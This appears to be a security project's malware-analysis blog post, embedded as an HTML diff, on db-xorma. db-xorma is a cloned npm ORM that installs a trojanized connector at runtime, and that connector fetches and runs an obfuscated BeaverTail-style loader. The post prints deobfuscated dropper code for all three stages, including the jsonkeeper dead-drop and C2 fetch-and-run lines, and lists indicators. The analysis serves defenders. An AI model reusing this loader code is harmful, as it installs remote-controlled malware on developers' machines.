@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>db-xorma: malware laundered through legit npm packages - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="db-xorma: malware laundered through legit npm packages - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>db-xorma: malware laundered through legit npm packages</h1>
+    <span class="post-meta">2026-06-21 &middot; npm &middot; db-xorma</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/db-xorma-laundry-everywhere.jpg" alt="The Buzz Lightyear 'everywhere' meme — Buzz gestures wide while Woody frets, captioned 'LAUNDRY. LAUNDRY, EVERYWHERE.' — for malware that hides behind clean clothes at every hop: a cloned ORM, a cloned connector, and a borrowed installer, all legitimate-looking, with the real payload fetched at runtime instead of shipped." style="width: 60%; height: auto;">
+<p>Most malicious npm packages smuggle their payload inside the tarball — an obfuscated blob, a poisoned install hook; db-xorma keeps its weapon off-package entirely and ships little more than a working library. It is a working clone of <code>xorma</code>, a real mobx-powered reactive ORM, with the store, the undo/redo history, even the author line all lifted — the clean clothes the whole operation hides behind. Instantiate any model and a static method the clone bolted on, <code>resetor()</code>, pulls a second package off the registry at runtime and lets it fetch a third stage.</p>
+<h2 id="stage-1-%E2%80%94-the-armed-commonjs-twin" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-the-armed-commonjs-twin"><span>Stage 1 — the armed CommonJS twin</span></a></h2>
+<pre class="lang-js"><code><span class="tok-kw">const</span> { syncApi: npm } = <span class="tok-fn">require</span>(<span class="tok-str">"oubliette"</span>);
+<span class="tok-com">// …called from the Model constructor: this.constructor.resetor()</span>
+<span class="tok-kw">static</span> <span class="tok-fn">resetor</span>() {
+  <span class="tok-kw">try</span> {
+    <span class="tok-kw">const</span> C = <span class="tok-fn">require</span>(<span class="tok-str">"db-dx-connector"</span>);
+    <span class="tok-kw">new</span> <span class="tok-fn">C</span>({}).<span class="tok-fn">queryDBConnect</span>();
+  } <span class="tok-kw">catch</span> (err) {
+    <span class="tok-kw">try</span> {
+      <span class="tok-fn">npm</span>().<span class="tok-fn">install</span>(<span class="tok-str">"db-dx-connector"</span>, { loglevel: <span class="tok-str">"silent"</span>, <span class="tok-str">"no-save"</span>: <span class="tok-kw">true</span> });
+      <span class="tok-kw">new</span> (<span class="tok-fn">require</span>(<span class="tok-str">"db-dx-connector"</span>))({}).<span class="tok-fn">queryDBConnect</span>();
+    } <span class="tok-kw">catch</span> (error) {}
+  }
+}
+</code></pre>
+<p>The dropper lives only in the CommonJS build — the <code>module</code> entry bundlers prefer is clean — so it fires server-side under require and never shows up in the browser bundle the README sells. On first call <code>db-dx-connector</code> isn't installed, the require throws, and the catch installs it then runs its connect method, so the second stage arrives on demand rather than in the tarball.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>File</th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>dist/index.js</code></td>
+<td><code>objectives/supply-chain/install-hook/scripts/dynamic-install</code></td>
+<td>Installs <code>db-dx-connector</code> via the aliased API when its <code>require</code> fails [T1195.002]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>dist/index.js</code></td>
+<td><code>objectives/supply-chain/impersonation/package-manager</code></td>
+<td>Third-party installer imported under the name <code>npm</code> [T1195.002]</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>dist/index.js</code></td>
+<td><code>micro-behaviors/process/create/exec</code></td>
+<td>Commented-out <code>execSync</code> reinstalling <code>clsx-js</code> — prior-campaign leftover</td>
+</tr>
+</tbody>
+</table>
+<h2 id="laundering-the-install-through-oubliette" tabindex="-1"><a class="header-anchor" href="#laundering-the-install-through-oubliette"><span>Laundering the install through oubliette</span></a></h2>
+<p>The install gets the same treatment: <code>npm().install(...)</code> looks like a programmatic API, but oubliette only assembles a real npm command string and runs it through child_process, so the genuine client does the fetching.</p>
+<pre class="lang-js"><code><span class="tok-com">// oubliette/lib/oubliette-sync.js — the whole mechanism</span>
+<span class="tok-kw">const</span> exec = <span class="tok-fn">require</span>(<span class="tok-str">"node:child_process"</span>).execSync;
+<span class="tok-kw">const</span> command = <span class="tok-tmpl">`npm <span class="tok-tmpl-expr">${name}</span> <span class="tok-tmpl-expr">${serialise(...args)}</span>`</span>.<span class="tok-fn">trim</span>(); <span class="tok-com">// "npm install db-dx-connector --loglevel silent"</span>
+<span class="tok-kw">const</span> output = <span class="tok-fn">exec</span>(command, options);
+</code></pre>
+<p>What db-xorma gains is a clean source — no <code>execSync</code>, no child_process import, not even an install string, because every such primitive sits one dependency away in oubliette. Oubliette is genuinely blameless, a real programmatic-npm wrapper by Stephen Cresswell born when npm dropped its API in v8.0.0; the malware simply rents its respectability.</p>
+<h2 id="stage-2-%E2%80%94-the-connector-that-compiles-a-ghost" tabindex="-1"><a class="header-anchor" href="#stage-2-%E2%80%94-the-connector-that-compiles-a-ghost"><span>Stage 2 — the connector that compiles a ghost</span></a></h2>
+<p>db-dx-connector is a near-verbatim clone of Divblox's real <code>dx-db-connector</code>, author line and all, with one extra method. It base64-decodes a <a href="http://jsonkeeper.com">jsonkeeper.com</a> URL, pulls the JSON's content field with axios, and compiles the response in memory as a fake module named error.js via <code>Module._compile</code> — no temp file, no eval keyword, and a public paste host the operator can re-stock without re-touching npm.</p>
+<pre class="lang-js"><code><span class="tok-kw">async</span> <span class="tok-fn">queryDBConnect</span>() {
+  <span class="tok-kw">try</span> {
+    <span class="tok-kw">const</span> HASH_KEY = <span class="tok-str">"aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9aSUFJSw"</span>; <span class="tok-com">// → jsonkeeper.com/b/ZIAIK</span>
+    <span class="tok-kw">const</span> s1 = (<span class="tok-kw">await</span> axios.<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(HASH_KEY))).data.content;
+    <span class="tok-kw">const</span> Mod = <span class="tok-fn">require</span>(<span class="tok-str">"node:module"</span>);
+    <span class="tok-kw">const</span> m = <span class="tok-kw">new</span> Mod.<span class="tok-fn">Module</span>(<span class="tok-str">"error.js"</span>, module.parent);
+    m.<span class="tok-fn">_compile</span>(s1, <span class="tok-str">"error.js"</span>); <span class="tok-com">// runs remote code as if it were error.js</span>
+  } <span class="tok-kw">catch</span> (error) {}
+}
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>File</th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/command-and-control/dropper/delivery/fetch-eval</code></td>
+<td>JsonKeeper payload fetched and run via <code>Module._compile</code> [T1102.001, T1059.007]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/supply-chain/hidden-payload/exec</code></td>
+<td>npm package compiles a hidden remote payload [T1195.002, T1059.007]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/supply-chain/trojanized/package</code></td>
+<td>Trojanized clone of <code>dx-db-connector</code> that stages the JsonKeeper payload [T1195.002]</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-3-%E2%80%94-the-beavertail-loader" tabindex="-1"><a class="header-anchor" href="#stage-3-%E2%80%94-the-beavertail-loader"><span>Stage 3 — the BeaverTail loader</span></a></h2>
+<p>The jsonkeeper blob is javascript-obfuscator output; decoded, it is the same loader catalogued across this site's DPRK finds. It spawns an npm install for axios and socket.io-client, GETs its next stage from a hard-coded address, writes it to the temp directory as <code>0001.dat</code>, and runs it with node. The C2 at <code>5.231.107.229</code> and the campaign id are new; the 0001.dat / socket.io-client / node-runner skeleton is not — it is <a href="/discoveries/2026/06/sqlite-node-createsql-dprk-gist/">@sqlite-node/createsql</a> and <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">web-dotenv</a> wearing yet another wrapper.</p>
+<pre class="lang-js"><code><span class="tok-com">// stage 3, deobfuscated (string array RC4-decoded)</span>
+<span class="tok-fn">spawn</span>(npmBin, <span class="tok-str">"npm install axios socket.io-client --no-save --no-progress --loglevel silent"</span>,
+      { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() });
+<span class="tok-kw">const</span> C2 = <span class="tok-str">"http://5.231.107.229/api/service/6818cc25a53cf93f290d85c334d8a3b8"</span>;
+axios.<span class="tok-fn">get</span>(C2).<span class="tok-fn">then</span>((res) =&gt; {
+  <span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"0001.dat"</span>), res.data, { flag: <span class="tok-str">"w+"</span> });
+  <span class="tok-fn">spawn</span>(npmBin, <span class="tok-str">"node 0001.dat"</span>, { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() });
+});
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>File</th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>stage3 payload</code></td>
+<td><code>objectives/command-and-control/dropper/execution/network-stage</code></td>
+<td>Obfuscated downloader fetches and runs the next Node stage [T1105]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>stage3 payload</code></td>
+<td><code>objectives/supply-chain/hidden-payload/runtime</code></td>
+<td>Obfuscated loader hides staged execution at runtime</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>stage3 payload</code></td>
+<td><code>objectives/anti-static/obfuscation/obfuscator/js-obfuscator</code></td>
+<td>javascript-obfuscator string-array + rotation decoder</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>stage3 payload</code></td>
+<td><code>micro-behaviors/process/create/spawn</code></td>
+<td><code>windowsHide</code> spawn of <code>node 0001.dat</code> from <code>tmpdir</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>db-xorma</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>1.0.5</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td>(empty)</td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>Austin Malerba</code></td>
+</tr>
+<tr>
+<td>License</td>
+<td><code>MIT</code></td>
+</tr>
+<tr>
+<td>Main</td>
+<td><code>dist/index.js</code></td>
+</tr>
+<tr>
+<td>Module</td>
+<td><code>dist/index.mjs</code></td>
+</tr>
+<tr>
+<td>Dependencies</td>
+<td><code>oubliette ^1.0.2</code>, <code>mobx ^6.13.5</code></td>
+</tr>
+<tr>
+<td>Peer dependencies</td>
+<td><code>mobx ^6.0.0</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stage 1 tarball (<code>db-xorma</code>) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/50631ecc747eab0af192ad4f328081047fe320d5b19bf8746c27b6c5e25861a6">50631ecc747eab0af192ad4f328081047fe320d5b19bf8746c27b6c5e25861a6</a></td>
+</tr>
+<tr>
+<td>Stage 1 <code>index.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/392b84c49a18b431b6f454c715a8f6b43e63f95d47b44b55dd70a85c8ed8c465">392b84c49a18b431b6f454c715a8f6b43e63f95d47b44b55dd70a85c8ed8c465</a></td>
+</tr>
+<tr>
+<td>Stage 2 tarball (<code>db-dx-connector</code>) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/2a94901a01417bf2c0096556725ca56619f176b0c79d3d6a1fcf4ff48e35e35b">2a94901a01417bf2c0096556725ca56619f176b0c79d3d6a1fcf4ff48e35e35b</a></td>
+</tr>
+<tr>
+<td>Stage 2 <code>index.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/5ec319f44610644a95e0cfaccf4fba6cbe3b2f0a1532f9179bcff3d22b121cbe">5ec319f44610644a95e0cfaccf4fba6cbe3b2f0a1532f9179bcff3d22b121cbe</a></td>
+</tr>
+<tr>
+<td>Stage 3 payload SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/8cd5ddcaed0e7f15b570a531d59f1dd6698d9bd7246dbf87c59e877a8720b6ff">8cd5ddcaed0e7f15b570a531d59f1dd6698d9bd7246dbf87c59e877a8720b6ff</a></td>
+</tr>
+<tr>
+<td>Stage 3 dead-drop</td>
+<td><code>https://www.jsonkeeper.com/b/ZIAIK</code></td>
+</tr>
+<tr>
+<td>C2</td>
+<td><code>http://5.231.107.229/api/service/6818cc25a53cf93f290d85c334d8a3b8</code></td>
+</tr>
+<tr>
+<td>Campaign id</td>
+<td><code>6818cc25a53cf93f290d85c334d8a3b8</code></td>
+</tr>
+<tr>
+<td>Runtime-installed package</td>
+<td><code>db-dx-connector</code></td>
+</tr>
+<tr>
+<td>Prior-campaign target (commented)</td>
+<td><code>clsx-js</code></td>
+</tr>
+<tr>
+<td>Dropped artifact</td>
+<td><code>0001.dat</code> (in <code>os.tmpdir()</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>Strip the three clean wrappers — a real ORM, a real connector, a real installer — and db-xorma is just a courier: npm does the fetching, npm does the detonating, and the dirtiest laundry, the obfuscated loader, is the one thing it never carries. The whole bet was that subtlety reads as safety — nothing obfuscated, nothing on disk, the install buried one dependency deep — yet Atomdrift flagged every hop as hostile anyway, because it scores the plumbing, not the dirt, and a laundered channel is still a channel.</p>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
